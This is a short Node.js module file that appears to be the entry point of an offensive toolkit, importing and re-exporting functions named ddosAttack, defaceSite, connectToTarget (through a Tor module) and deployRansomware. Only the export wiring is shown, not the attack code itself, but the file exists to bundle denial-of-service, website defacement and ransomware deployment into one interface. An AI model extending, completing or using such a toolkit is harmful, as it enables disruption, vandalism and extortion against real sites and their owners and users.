const ddos = require('./ddos/ddos');
const deface = require('./deface/deface');
const connect = require('./tor/tor');
const ransomware = require('./ransomware/ransomware');

module.exports = {
    ddos: ddos.ddosAttack,
    deface: deface.defaceSite,
    connect: connect.connectToTarget,
    ransomware: ransomware.deployRansomware
};